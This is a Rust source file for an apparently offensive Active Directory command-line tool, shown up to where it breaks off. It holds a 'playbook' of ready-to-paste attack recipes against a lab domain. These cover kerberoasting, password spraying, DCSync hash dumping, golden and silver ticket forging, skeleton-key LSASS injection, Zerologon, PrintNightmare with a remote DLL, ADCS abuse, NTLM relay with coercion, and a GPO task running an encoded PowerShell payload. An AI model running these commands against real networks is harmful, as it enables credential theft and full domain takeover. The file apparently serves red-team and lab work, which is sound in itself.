//! Scenario playbook: ready-to-paste command recipes for the standard AD
//! attack scenarios, grounded in the real flag surface of the CLI (the
//! examples mirror COMMAND_LIST.md one-liners). Pure offline help command.

use colored::Colorize;

/// `ovt playbook` subcommands.
#[derive(Debug, Clone, clap::Subcommand)]
pub enum PlaybookAction {
    /// List all scenario names with one-line descriptions
    List,
    /// Show the full recipe for one scenario
    Show {
        /// Scenario name or alias (case-insensitive) -- `ovt playbook list` for options
        name: String,
    },
}

/// One step inside a scenario recipe: a titled sequence of commands.
pub struct Step {
    /// Short step title.
    pub title: &'static str,
    /// Ready-to-paste command lines.
    pub commands: &'static [&'static str],
    /// Operational note.
    pub note: &'static str,
}

/// A full scenario recipe.
pub struct Recipe {
    /// Canonical scenario name (`ovt playbook show <name>`).
    pub name: &'static str,
    /// Alternate names accepted by `show`.
    pub aliases: &'static [&'static str],
    /// One-line description for `list`.
    pub summary: &'static str,
    /// What you need before running.
    pub prereqs: &'static [&'static str],
    /// Ordered steps.
    pub steps: &'static [Step],
}

/// All scenario recipes. Order = kill-chain order.
pub const RECIPES: &[Recipe] = &[
    Recipe {
        name: "recon",
        aliases: &["enumeration", "discovery"],
        summary: "Null-session to authenticated enumeration sweep of domain objects.",
        prereqs: &[
            "DC reachable",
            "credentials for phases 2+ (any domain user works here)",
        ],
        steps: &[
            Step {
                title: "0) Port/process sweep of the DC",
                commands: &[
                    "ovt scan --targets 192.168.57.10",
                    "ovt nxc smb 192.168.57.0/24 -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "nxc fingerprints SMB/LDAP differences and signs hosts fast; iterate the option per protocol.",
            },
            Step {
                title: "1) Credentialless pre-enum (LDAP unsigned null session / anonymous)",
                commands: &[
                    "ovt enum pre -H 192.168.57.10 -d sevenkingdoms.local",
                    "ovt enum null-session -H 192.168.57.10 -d sevenkingdoms.local",
                    "ovt enum anonymous -H 192.168.57.10 -d sevenkingdoms.local",
                ],
                note: "If rootdSE allows it, you already get users/computers -- check hardening first.",
            },
            Step {
                title: "2) Authenticated object enumeration",
                commands: &[
                    "ovt enum users -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt enum computers -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt enum groups -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt enum spns -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt enum delegations -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "spns feeds the kerberoast recipe; delegations feeds RBCD / unconstrained scavenging.",
            },
            Step {
                title: "3) Hardened-DC bypass enumeration over ADWS (9389)",
                commands: &[
                    "ovt adws enum -t kingslanding.sevenkingdoms.local -D sevenkingdoms.local --username vagrant --hash <nt-hash>",
                ],
                note: "ADWS (WS-Trust + NTLM) still works when the policy flips to LDAP-signing-required + LDAPS-only.",
            },
            Step {
                title: "4) Full sweep + escalation audit",
                commands: &[
                    "ovt enum all -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt move escalation -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "enum all runs every reaper module; escalation ranks who can reach DA.",
            },
        ],
    },
    Recipe {
        name: "kerberoast",
        aliases: &["tgs-crack"],
        summary: "Find SPNs, request service tickets, crack service account NTLM hashes.",
        prereqs: &["any domain user", "SPN accounts exist"],
        steps: &[
            Step {
                title: "1) List SPN accounts (and let reaper rank roastability)",
                commands: &[
                    "ovt enum spns -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "Follows with the kerberoastable flag; SPNs with no preauth are the fast wins.",
            },
            Step {
                title: "2) Request + roast TGSs",
                commands: &[
                    "ovt kerberos roast -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "AES-only enforcement is default for modern DCs; use --downgrade-rc4 on legacy setups for easy cracking.",
            },
            Step {
                title: "3) Crack the hash-format output offline",
                commands: &[
                    "ovt crack --file kerberoast_hashes.txt --wordlist rockyou.txt",
                    "ovt crack --file ./kerberoast_hashes.txt --wordlist rockyou.txt --hashcat",
                ],
                note: "hashcat path optional if on PATH; GPU path when the wordlist fails.",
            },
        ],
    },
    Recipe {
        name: "asreproast",
        aliases: &["asrep"],
        summary: "Crack accounts with preauth disabled via AS-REP Roasting.",
        prereqs: &["any domain user", "targets with UF_DONT_REQUIRE_PREAUTH"],
        steps: &[
            Step {
                title: "1) Find as-rep roastable accounts",
                commands: &[
                    "ovt enum asrep -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "Works on any account dont_require_preauth -- passwordless machine accounts sometimes land here.",
            },
            Step {
                title: "2) Roast -- passwordless TGT requests + export hashcat format",
                commands: &[
                    "ovt kerberos asrep-roast -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt kerberos asrep-roast --userlist users.txt",
                ],
                note: "userlist mode works pre-auth (checks list of candidate names anonymously).",
            },
            Step {
                title: "3) Crack",
                commands: &["ovt crack --file asrep_hashes.txt --wordlist rockyou.txt"],
                note: "hashcat -m 18200 format.",
            },
        ],
    },
    Recipe {
        name: "spray",
        aliases: &["password-spray", "brute"],
        summary: "Username/password combination spray with rate-limit handling.",
        prereqs: &["reject-threshold known (lockout awareness)"],
        steps: &[
            Step {
                title: "1) Gather a user list",
                commands: &[
                    "ovt kerberos user-enum -H 192.168.57.10 -d sevenkingdoms.local -U users.txt",
                    "ovt kerberos user-enum -H 192.168.57.10 -d sevenkingdoms.local --use-ldap",
                ],
                note: "Kerberos preauth user-enum works without LDAP access (username enumeration error differences).",
            },
            Step {
                title: "2) Spray",
                commands: &[
                    "ovt spray -H 192.168.57.10 -d sevenkingdoms.local -U users.txt --password 'Season2026!'",
                ],
                note: "Keep at most 1 password / small subset per run to avoid lockouts (default spray pacing applies).",
            },
        ],
    },
    Recipe {
        name: "dcsync",
        aliases: &["drsuapi", "ntds"],
        summary: "Dump NTDS hashes/keys from a DC via DRSUAPI (GetNcChanges).",
        prereqs: &[
            "Replicating Directory Changes (Get-Changes) rights -- DA or admins with DS-Replication",
        ],
        steps: &[
            Step {
                title: "1) DCSync one account (hash generation check)",
                commands: &[
                    "ovt dump -t 192.168.57.10 dcsync -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "drsuapi test: run while you have admin -- proves replication channel before full dump.",
            },
            Step {
                title: "2) Full NTDS dump (or VSS fallback)",
                commands: &[
                    "ovt dump -t 192.168.57.10 ntds -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt dump -t 192.168.57.10 ntds-vss -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "ntds = DRSUAPI channel; ntds-vss shells through disk shadow when DRSUAPI is blocked.",
            },
            Step {
                title: "3) Offline NTDS.dit (from a file copy)",
                commands: &[
                    "ovt secrets ntds-dit --ntds ./ntds.dit --system ./SYSTEM",
                    "ovt secrets ntds --ntds ./ntds.dit --bootkey 0c8e...64hex -o secretsdump.out",
                ],
                note: "for machine-kicked dumps: NT/DSA/HD data stays in lsa keys; add --include-deleted for deleted-account visibility.",
            },
            Step {
                title: "4) Turn krbtgt hash into a golden ticket",
                commands: &[
                    "ovt forge golden -d sevenkingdoms.local --domain-sid \"S-1-5-21-<domain-sid>\" --krbtgt-hash <32hex> --user administrator",
                ],
                note: "DRSUAPI output for krbtgt gives AES-256 keys too; RC4 hash is the classic golden material.",
            },
        ],
    },
    Recipe {
        name: "golden",
        aliases: &["golden-ticket"],
        summary: "Forge a golden ticket from the krbtgt NT/M hash.",
        prereqs: &["krbtgt NT hash", "domain SID"],
        steps: &[
            Step {
                title: "1) Dry-run the shape first",
                commands: &[
                    "ovt forge golden -d sevenkingdoms.local --domain-sid \"S-1-5-21-<domain-sid>\" --krbtgt-hash \"00000000000000000000000000000000\" --user \"administrator\" --dry-run",
                ],
                note: "confirms parsing before plaintext operations.",
            },
            Step {
                title: "2) Forge + convert",
                commands: &[
                    "ovt forge golden -d sevenkingdoms.local --domain-sid \"S-1-5-21-<domain-sid>\" --krbtgt-hash <32hex> --user administrator --output golden.kirbi",
                    "ovt forge convert-ticket --input golden.kirbi --format ccache",
                ],
                note: "kirbi = Windows format; ccache = Linux/krb5 API format.",
            },
            Step {
                title: "3) Validate the ticket",
                commands: &["ovt kerberos describe ./golden.kirbi"],
                note: "check the username/sid/flags; --output-format json for scripting.",
            },
        ],
    },
    Recipe {
        name: "silver",
        aliases: &["silver-ticket"],
        summary: "Forge a silver ticket for a specific service hash.",
        prereqs: &["service account NT hash", "SPN"],
        steps: &[
            Step {
                title: "1) Forge the service ticket",
                commands: &[
                    "ovt forge silver -d sevenkingdoms.local --domain-sid S-1-5-21-<domain-sid> --service-hash <32hex> --user administrator --spn \"cifs/kingslanding.sevenkingdoms.local\" --output cifs.kirbi",
                ],
                note: "SPN must match the service hash owner (machine accounts for cifs/host).",
            },
            Step {
                title: "2) Convert + validate (kirbi -> ccache)",
                commands: &["ovt forge convert-ticket --input cifs.kirbi --format ccache"],
                note: "-feed the .ccache to exec/move via --ticket or KRB5CCNAME; verify with `ovt kerberos describe --file cifs.kirbi`.",
            },
        ],
    },
    Recipe {
        name: "diamond",
        aliases: &["diamond-ticket"],
        summary: "Diamond ticket: decrypt a user's live TGT, swap the PAC, re-encrypt with the krbtgt key.",
        prereqs: &[
            "krbtgt RC4/AES256 key",
            "credentials (-u/-p or --nt-hash) of the user whose TGT gets the modified PAC",
        ],
        steps: &[Step {
            title: "1) Modify a live TGT (PAC swap, KDC checksum preserved)",
            commands: &[
                "ovt forge diamond -d sevenkingdoms.local --domain-sid \"S-1-5-21-<domain-sid>\" --user vagrant --krbtgt-hash <32hex> -u vagrant -p vagrant",
            ],
            note: "--krbtgt-aes256 (64 hex) preferred over RC4 on modern DCs; output defaults to diamond.kirbi.",
        }],
    },
    Recipe {
        name: "skeleton-key",
        aliases: &["skeleton"],
        summary: "Inject a skeleton-key DLL onto the DC LSASS via service (reboot persists it).",
        prereqs: &["DA/admin on the DC", "payload DLL path on-disk"],
        steps: &[Step {
            title: "1) Validate payload + run",
            commands: &[
                "ovt forge skeleton -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!' --payload-path ./mimilib.dll",
            ],
            note: "payload_path is validated at config time -- make sure the file exists.",
        }],
    },
    Recipe {
        name: "lateral",
        aliases: &["exec", "shell"],
        summary: "Remote command execution across SMB/WMI/WinRM/DCOM.",
        prereqs: &["local admin on target (or PowerShell/winrm domain operator)"],
        steps: &[
            Step {
                title: "1) All methods through one binary (smbexec / wmiexec / psexec / winrm)",
                commands: &[
                    "ovt exec --target 192.168.57.10 --command \"whoami\" -d sevenkingdoms.local -u vagrant -p vagrant --method smbexec",
                    "ovt exec --target 192.168.57.10 --command \"ipconfig\" -d sevenkingdoms.local -u vagrant -p vagrant --method wmiexec",
                    "ovt exec --target 192.168.57.10 --command \"net user hacker P@ss /add\" -d sevenkingdoms.local -u vagrant -p vagrant --method psexec",
                    "ovt exec --target 192.168.57.10 --command \"whoami\" -d sevenkingdoms.local -u vagrant -p vagrant --method winrm",
                ],
                note: "smbexec = taskless SCM exec, wmiexec uses Win32_Process, psexec uploads+runs a service binary, winrm via WS-Man (--method accepts smbexec|wmiexec|psexec|winrm|dcom|auto).",
            },
            Step {
                title: "3) Hash auth instead of password",
                commands: &[
                    "ovt exec --target 192.168.57.10 --command \"whoami\" -d sevenkingdoms.local -u Administrator --nt-hash <32hex>",
                ],
                note: "--nt-hash works on all exec and move subcommands (credentials captured via DCSync/LSA dumps).",
            },
        ],
    },
    Recipe {
        name: "rbcd",
        aliases: &["resource-based-delegation", "exploit-rbcd"],
        summary: "RBCD full chain: create machine account, set msDS-AllowedToAct, forge service ticket.",
        prereqs: &["GenericAll/Write on the target computer object"],
        steps: &[
            Step {
                title: "1) Create a controlled computer account",
                commands: &[
                    "ovt add-computer --name ATTACKERPC -H 192.168.57.10 -u vagrant -d sevenkingdoms.local -p vagrant",
                ],
                note: "Password randomizes to 24 chars if omitted; default quota is 10 per user (ms-DS-MachineAccountQuota).",
            },
            Step {
                title: "2) Set msDS-AllowedToActOnBehalfOfOtherIdentity on the victim",
                commands: &[
                    "ovt exploit rbcd --target-dn \"CN=WINTERSVS,CN=Computers,DC=sevenkingdoms,DC=local\" --attacker \"ATTACKERPC$\" --password Exploit123!",
                ],
                note: "Write the allowed-to-act SID blob on the delegate target.",
            },
            Step {
                title: "3) S4U2Self + S4U2Proxy with the attacker machine account",
                commands: &[
                    "ovt kerberos get-tgs -H 192.168.57.10 -d sevenkingdoms.local -u ATTACKERPC$ -p Exploit123! --spn \"cifs/WINTERSVS.sevenkingdoms.local\" --impersonate administrator",
                ],
                note: "With AllowedToAct set, the machine account gets a ticket-to-self on behalf of the impersonated user -- the classic RBCD finish.",
            },
        ],
    },
    Recipe {
        name: "shadowcred",
        aliases: &["shadow", "shadow-credentials", "keycred"],
        summary: "Shadow Credentials: write msDS-KeyCredentialLink then PKINIT as the target.",
        prereqs: &[
            "write access to msDS-KeyCredentialLink (GenericAll/Write/Property-extended rights)",
        ],
        steps: &[
            Step {
                title: "1) Full attack (add key -> auth -> clean)",
                commands: &[
                    "ovt exploit shadow-credentials -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --target-dn \"CN=vagrant,CN=Users,DC=sevenkingdoms,DC=local\"",
                ],
                note: "Targets a user's DN; passwordless GetUser via PKINIT yields TGT with session key.",
            },
            Step {
                title: "2) Manual steps if auto-cleanup fails",
                commands: &[
                    "ovt shadow-cred add \"CN=vagrant,CN=Users,DC=sevenkingdoms,DC=local\" -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt shadow-cred list vagrant -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt shadow-cred remove vagrant --key-id <32hex> -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "device-id is the referential anchor for cleanup. rc=21 means missing rights -- check AddKeyCredentialLink edge.",
            },
        ],
    },
    Recipe {
        name: "samname",
        aliases: &["samnamespoof", "nopac", "cve-2021-42278", "cve-2021-42287"],
        summary: "sAMAccountName spoofing / noPac family -- exploit KDC confusion for DA.",
        prereqs: &[
            "can add machine accounts",
            "DC unpatched for CVE-2021-42278/42287",
        ],
        steps: &[
            Step {
                title: "1) noPac full chain (direct)",
                commands: &[
                    "ovt forge no-pac --target-dc kingslanding.sevenkingdoms.local -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "Direct noPac in forge -- works in one shot against unpatched servers.",
            },
            Step {
                title: "2) Manual sAMNameSpoof route",
                commands: &["ovt exploit samnamespoof --dc-sam \"DC01$\" --password Exploit123!"],
                note: "Renames account to match DC name; KDC ticket confusion follows; cleanup removes the artifact.",
            },
            Step {
                title: "3) Cleanup",
                commands: &["ovt exploit cleanup samnamespoof"],
                note: "remove the spoofed computer account (pass --computer-dn if nondefault).",
            },
        ],
    },
    Recipe {
        name: "zerologon",
        aliases: &["cve-2020-1472", "zb"],
        summary: "Zero the machine password via Netlogon cryptography flaw -- domain takeover.",
        prereqs: &[
            "unpatched Netlogon (Buildable channel)",
            "DC host reachable",
        ],
        steps: &[
            Step {
                title: "1) Check + probe (non-disruptive)",
                commands: &[
                    "ovt zerologon check -t 192.168.57.10",
                    "ovt zerologon probe -t 192.168.57.10",
                ],
                note: "check is passive; probe exercises more channel rounds.",
            },
            Step {
                title: "2) Exploit + restore (extremely disruptive -- password reset changes DC)",
                commands: &["ovt zerologon exploit -t 192.168.57.10 --force"],
                note: "--force required; the DC machine password is zeroed -- restore it afterwards or the domain bricks itself. Use `check` alone to prove CVE presence safely.",
            },
            Step {
                title: "3) Harvest credentials afterwards",
                commands: &[
                    "ovt dump -t 192.168.57.10 dcsync -d sevenkingdoms.local -u administrator -p 'Password123!'",
                ],
                note: "With DA gained, DCSync to keep the buttons for golden-forging as read-only analysis.",
            },
        ],
    },
    Recipe {
        name: "printnightmare",
        aliases: &["nightmare", "pn", "cve-2021-34527", "cve-2021-1675"],
        summary: "Print Spooler RCE via MS-RPRN AddPrinterDriver with arbitrary DLL.",
        prereqs: &["target has spooler reachable", "unpatched"],
        steps: &[
            Step {
                title: "1) Check the spooler first",
                commands: &[
                    "ovt printnightmare check -t 192.168.57.22",
                    "ovt printnightmare list -t 192.168.57.22",
                ],
                note: "list enumerates existing driver names.",
            },
            Step {
                title: "2) Exploit into SYSTEM",
                commands: &[
                    "ovt printnightmare exploit -t 192.168.57.22 --dll \\\\192.168.57.5\\share\\payload.dll",
                ],
                note: "//192.168.57.5/share/payload.dll -- serve via ovt ntlm smb-daemon --share-root ./payloads --share-name payloads.",
            },
            Step {
                title: "3) Cleanup the driver",
                commands: &["ovt printnightmare delete -t 192.168.57.22 --driver-name PN_RCE"],
                note: "remove the leftover driver name.",
            },
        ],
    },
    Recipe {
        name: "certifried",
        aliases: &["cve-2022-26923"],
        summary: "ADCS machine-account privilege escalation via dNSHostName spoofing.",
        prereqs: &["web enrollment reachable", "Machine template enrollable"],
        steps: &[Step {
            title: "1) Run the attack (creates spoofed machine + requests cert)",
            commands: &[
                "ovt certifried -c \"http://192.168.57.10/certsrv\" -t kingslanding.sevenkingdoms.local",
            ],
            note: "template Machine is default; auto-cleanup restores the dNSHostName by default (cleanup=false to keep artifacts).",
        }],
    },
    Recipe {
        name: "adcs",
        aliases: &["certify", "esc", "esc1"],
        summary: "ADCS template abuse: enumerate then fire the right ESC technique.",
        prereqs: &[
            "web enrollment (certsrv)",
            "auth as any user with enrollment rights",
        ],
        steps: &[
            Step {
                title: "1) Enumerate CAs + vulnerable templates (auto ranks them)",
                commands: &[
                    "ovt adcs enum -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt adcs auto -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "auto mode triggers ESC1->6->9 exploit attempt order and stops on first success.",
            },
            Step {
                title: "2) ESC1 -- template allows SAN + enrollment on behalf",
                commands: &[
                    "ovt adcs esc1 --ca \"192.168.57.10\\SEVENKINGDOMS-CA\" --template \"User\" --target-user administrator -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --http",
                ],
                note: "The returned certificate authenticates as the target-user via the forged SAN; convert to PEM for --pkinit-cert.",
            },
            Step {
                title: "3) ESC3 -- enrollment agent double cert",
                commands: &[
                    "ovt adcs esc3 --ca \"192.168.57.10\\SEVENKINGDOMS-CA\" --agent-template EnrollmentAgent --target-template User --target-user administrator -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!' --http",
                ],
                note: "two-step: agent cert first, then user cert on behalf.",
            },
            Step {
                title: "4) ESC8 -- NTLM relay to web enrollment (needs relay infrastructure)",
                commands: &[
                    "ovt adcs esc8 --url \"http://192.168.57.10/certsrv/\" --target-user administrator",
                    "ovt ntlm relay --targets \"http://192.168.57.10/certsrv/\" --port 8080",
                ],
                note: "esc8 prints the relay plan; the generic HTTP relay to the certsrv endpoint performs the actual ESC8 attack when a coerced auth lands on it (see playbook relay-to-da).",
            },
            Step {
                title: "5) ESC9 -- UPN poisoning (WS2025-safe via CES)",
                commands: &[
                    "ovt adcs esc9 --ca \"192.168.57.10\\SEVENKINGDOMS-CA\" --template User --target-upn administrator@sevenkingdoms.local --victim vagrant --original-upn vagrant@sevenkingdoms.local -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!' --http",
                ],
                note: "needs the CAPolicy config on WS2025 -- CertAutoEnroll handles the trust-store CES enroll route.",
            },
        ],
    },
    Recipe {
        name: "relay",
        aliases: &["coercion", "responder", "ntlm-relay", "petitpotam"],
        summary: "NTLM capture + relay: poison, coerce, relay into SMB/LDAP/ADCS/web targets.",
        prereqs: &[
            "local admin to bind 445/lanm (settle with --interface)",
            "targets with SMB signing disabled for SMB-relay targets",
        ],
        steps: &[
            Step {
                title: "1) Start the capture side (pick ONE poisoner or daemon)",
                commands: &[
                    "ovt ntlm respond --interface eth0",
                    "ovt ntlm smb-daemon --interface 0.0.0.0 --port 445",
                    "ovt ntlm smb-daemon --share-root ./payloads --share-name payloads",
                ],
                note: "respond = Responder full set; smb-daemon = rogue SMB2 fingerprinter (impacket smbserver.py parity while capturing).",
            },
            Step {
                title: "2) Relay with built-in auto-coercion (triggers fire from the relay controller)",
                commands: &[
                    "ovt ntlm ldap-relay --target 192.168.57.10 --port 8080 --auto-coerce-targets 192.168.57.22 --auto-coerce-domain sevenkingdoms.local --auto-coerce-user vagrant --auto-coerce-password vagrant",
                    "ovt ntlm relay --targets \"smb://192.168.57.10\" --port 8080 --auto-coerce-targets 192.168.57.22 --auto-coerce-domain sevenkingdoms.local --auto-coerce-user vagrant --auto-coerce-password vagrant",
                ],
                note: "The relay command starts the listener first and then fires PrinterBug/PetitPotam/DFSCoerce (MS-RPRN / MS-EFSRPC / MS-DFSNM) at each --auto-coerce-targets host, pointing the UNC back at your listener IP.",
            },
            Step {
                title: "3) Pick the relay target protocol",
                commands: &[
                    "ovt ntlm ldap-relay --target 192.168.57.10 --port 8080",
                    "ovt ntlm smb-relay --targets \"smb://192.168.57.10\" --port 8445",
                    "ovt ntlm relay --targets \"http://192.168.57.10/certsrv/\" --port 8080",
                ],
                note: "LDAP relay to the DC can raise DomainAdmin (needs signing disabled or the built-in bypass); SMB relay needs signing-disabled; HTTP relay to certsrv chains into ESC8.",
            },
            Step {
                title: "4) Automated one-box chain",
                commands: &[
                    "ovt ntlm ldap-relay --target 192.168.57.10 --port 8080 --auto-coerce-targets 192.168.57.22 --auto-coerce-domain sevenkingdoms.local --auto-coerce-user vagrant --auto-coerce-password vagrant",
                ],
                note: "--auto-coerce-* fires the coercion triggers itself once the listener is ready.",
            },
            Step {
                title: "5) Kerberos capture (krbrelayx parity)",
                commands: &[
                    "ovt ntlm smb-daemon --krb5-capture --ticket-dir ./krb_tickets",
                    "ovt ntlm smb-daemon --krb5-capture --ticket-dir ./krb_tickets --krb-key <32hex>",
                ],
                note: "with --krb-key the kirbi tickets are decrypted, ready for pass-the-ticket.",
            },
        ],
    },
    Recipe {
        name: "unconstrained",
        aliases: &["delegation"],
        summary: "Find and abuse unconstrained/protocol-transition delegations.",
        prereqs: &["any domain user", "monitorable DC"],
        steps: &[
            Step {
                title: "1) Enumerate delegation shapes",
                commands: &[
                    "ovt enum delegations -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt enum audit -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "unconstrained delegation targets listen to any principal -- found via delegation entries + acl findings.",
            },
            Step {
                title: "2) Adaptive coercing into unconstrained-delegation host (capture TGT)",
                commands: &[
                    "ovt ntlm smb-daemon --krb5-capture --ticket-dir ./krb_tickets",
                    "ovt ntlm smb-relay --targets \"smb://192.168.57.10\" --port 445 --auto-coerce-targets 192.168.57.22 --auto-coerce-domain sevenkingdoms.local --auto-coerce-user vagrant --auto-coerce-password vagrant",
                ],
                note: "the relay controller raises the listener, then coerces the unconstrained host (PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce asked in order, UNC -> your listener IP).",
            },
            Step {
                title: "3) Rotate the captured DC TGT or re-use it directly",
                commands: &[
                    "ovt forge rotate-ticket --input ./krb_tickets/DC01$.kirbi --old-key <old-krbtgt-hex> --new-key <new-krbtgt-hex>",
                ],
                note: "rotate-ticket re-encrypts under a different krbtgt key (16-hex RC4 or 32-hex AES256); pass the .kirbi straight to exec/move with --auth-method ticket otherwise.",
            },
        ],
    },
    Recipe {
        name: "laps",
        aliases: &["local-passwords"],
        summary: "Read LAPS-managed local admin passwords and pivot into hosts.",
        prereqs: &["read access to ms-Mcs-AdmPwd (or ms-LAPS-Password)"],
        steps: &[
            Step {
                title: "1) Dump LAPS passwords",
                commands: &[
                    "ovt laps -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt laps -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --computer KINGSLANDING$",
                ],
                note: "reads ms-Mcs-AdmPwd / ms-LAPS-Password per computer; --computer narrows to one host.",
            },
            Step {
                title: "2) Interactive check + pivot",
                commands: &[
                    "ovt nxc smb 192.168.57.10 -d . -u .\\administrator -p '<laps-password>'",
                    "ovt move smbexec -H 192.168.57.10 -d . -u administrator -p '<laps-password>' --command \"whoami\"",
                ],
                note: "LAPS passwords belong to local .\\administrator -- domain params are for the query only (once you know, drop the -d).",
            },
        ],
    },
    Recipe {
        name: "mssql",
        aliases: &["mssql-rce", "sql"],
        summary: "MSSQL exposure: audit, xp_cmdshell RCE, linked-server pivot chains.",
        prereqs: &[
            "sql authentication creds or service-account shadow (svc-sql SPN kerberoast wins often)",
        ],
        steps: &[
            Step {
                title: "1) Audit the instance (targeter uses --target, not -H)",
                commands: &[
                    "ovt mssql audit --target 192.168.57.100",
                    "ovt mssql linked-servers --target 192.168.57.100",
                ],
                note: "audit checks config posture; linked-servers draws the remote-executable chain.",
            },
            Step {
                title: "2) Enable + use xp_cmdshell",
                commands: &[
                    "ovt mssql enable-xp-cmd-shell --target 192.168.57.100",
                    "ovt mssql xp-cmd-shell --target 192.168.57.100 --command \"whoami\"",
                    "ovt mssql check-xp-cmd-shell --target 192.168.57.100",
                ],
                note: "Sysadmin creds ride the global -d/-u/-p flags; `query` runs raw SQL with --query/-q.",
            },
            Step {
                title: "3) Pivot via linked servers",
                commands: &[
                    "ovt move mssql -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "move mssql traverses the linked-server chain from the domain view and reports which hosts open up.",
            },
        ],
    },
    Recipe {
        name: "offline-dump",
        aliases: &["secrets", "lsa", "sam"],
        summary: "Offline parse of extracted SAM/LSA/NTDS files with full secret-class decoding.",
        prereqs: &["hive/dit files exfiltrated"],
        steps: &[
            Step {
                title: "1) Parse hives",
                commands: &[
                    "ovt secrets sam --sam ./SAM --system ./SYSTEM",
                    "ovt secrets lsa --security ./SECURITY --system ./SYSTEM",
                    "ovt secrets dcc2 --security ./SECURITY --system ./SYSTEM",
                    "ovt secrets ntds-dit --ntds ./ntds.dit --system ./SYSTEM --include-deleted",
                ],
                note: "lsa output now decodes class per secret: G$DPAPI_MACHINE_KEY/USER_KEY surface (masterkey version/GUID/SID), G$BCKKEYLINK\\{GUID} backup-key material.",
            },
            Step {
                title: "2) LSASS minidump parsing",
                commands: &[
                    "ovt dump-lsass -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt dump-lsass -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --method minidump",
                ],
                note: "NT/LM hashes + AES-256 session keys from the minidump; MS-EVEN fallback works when the SMB download fails (WS2025 sandbox).",
            },
        ],
    },
    Recipe {
        name: "quick-matrix",
        aliases: &["vuln-scan", "cve-matrix"],
        summary: "One-line-per-CVE quick verification sweep.",
        prereqs: &["network reachability"],
        steps: &[
            Step {
                title: "1) Passive vuln + patch scanning",
                commands: &[
                    "ovt sherlock -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt doctor",
                ],
                note: "sherlock enumerates missing KBs / exploitable issues; doctor inspects the running environment.",
            },
            Step {
                title: "2) CVE probes (read-only checks up front)",
                commands: &[
                    "ovt zerologon check -t 192.168.57.10",
                    "ovt printnightmare check -t 192.168.57.22",
                    "ovt adcs enum -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt adcs auto -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "All check/enum steps are non-disruptive; escalate only on the technique recipes (zerologon, printnightmare, adcs).",
            },
        ],
    },
    Recipe {
        name: "gpo",
        aliases: &["gpp-abuse", "gpo-write"],
        summary: "Enumerate GPOs, inject scheduled-task payloads, abuse GPP cPassword.",
        prereqs: &["Write access to a GPO's SYSVOL directory (WriteGPO/Membership)"],
        steps: &[
            Step {
                title: "1) Enumerate",
                commands: &[
                    "ovt gpo enum -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt enum gpos -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                ],
                note: "enum gpos gives the GPO GUIDs; gpo enum correlates accessible-GPO targets.",
            },
            Step {
                title: "2) Write a scheduled-task payload",
                commands: &[
                    "ovt gpo write -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --gpo \"{GUID}\" --sysvol \"\\\\sevenkingdoms.local\\sysvol\\sevenkingdoms.local\\Policies\\{GUID}\" --command \"powershell -enc <base64-payload>\"",
                ],
                note: "Writes Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml and runs the command as LOCAL SYSTEM at the next policy apply; cleanup deletes it.",
            },
            Step {
                title: "3) Crack GPP cPassword offline",
                commands: &[
                    "ovt gpp --file Groups.xml",
                    "ovt gpp --cpassword \"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+...\"",
                ],
                note: "GPP MS-Press-mirrored CVE-2014-1812 -- the AES key is published and embedded in this release.",
            },
        ],
    },
    Recipe {
        name: "graph",
        aliases: &["bloodhound", "path"],
        summary: "Build the object graph, find shortest DA paths, export for BloodHound.",
        prereqs: &["any authenticated user (or existing SharpHound json)"],
        steps: &[
            Step {
                title: "1) Build + inspect",
                commands: &[
                    "ovt graph build -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant",
                    "ovt graph tree --file attack_graph.json",
                    "ovt graph stats --file attack_graph.json",
                ],
